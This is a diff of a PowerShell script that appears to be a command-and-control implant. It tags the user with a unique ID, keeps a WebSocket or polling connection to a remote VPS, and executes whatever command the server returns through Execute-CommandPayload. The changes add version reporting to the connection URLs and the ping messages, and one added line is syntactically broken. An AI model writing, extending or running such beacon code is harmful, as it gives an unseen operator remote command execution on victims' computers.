@@ -27,6 +27,10 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
+\ = "8417ed1"
+$clientVersion = $SCRIPT_VERSION
+
+
 
 function Execute-CommandPayload ($r) {
 	if ($r.run -eq $true -and -not [string]::IsNullOrEmpty($r.cmd)) {
@@ -70,7 +74,7 @@ function Execute-CommandPayload ($r) {
 try {
 	while ($true) {
 		try {
-			$wsUri = "$VPS_WS_URL?username=" + [System.Uri]::EscapeDataString($uniqueUser)
+			$wsUri = "$VPS_WS_URL?username=" + [System.Uri]::EscapeDataString($uniqueUser) + "&version=" + [System.Uri]::EscapeDataString($clientVersion)
 			$ws = New-Object System.Net.WebSockets.ClientWebSocket
 			$cts = New-Object System.Threading.CancellationTokenSource
 			$cts.CancelAfter(10000)
@@ -83,7 +87,8 @@ try {
 
 				while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
 					if (([DateTime]::UtcNow - $lastPing).TotalSeconds -ge 15) {
-						$pingBytes = [System.Text.Encoding]::UTF8.GetBytes('{"type":"ping"}')
+						$pingObj = @{ type = "ping"; version = $clientVersion } | ConvertTo-Json -Compress
+						$pingBytes = [System.Text.Encoding]::UTF8.GetBytes($pingObj)
 						$pingSeg = [System.ArraySegment[byte]]::new($pingBytes)
 						$ws.SendAsync($pingSeg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
 						$lastPing = [DateTime]::UtcNow
@@ -115,7 +120,7 @@ try {
 		}
 		catch {
 			try {
-				$u = $VPS_POLL_URL + "?username=" + [System.Uri]::EscapeDataString($uniqueUser)
+				$u = $VPS_POLL_URL + "?username=" + [System.Uri]::EscapeDataString($uniqueUser) + "&version=" + [System.Uri]::EscapeDataString($clientVersion)
 				$r = Invoke-RestMethod -Method Get -Uri (New-Object System.Uri($u)) -TimeoutSec 5
 				Execute-CommandPayload $r
 			}
@@ -123,6 +128,7 @@ try {
 		}
 		Start-Sleep -Seconds 2
 	}
+
 }
 finally {
 	if ($m1) {
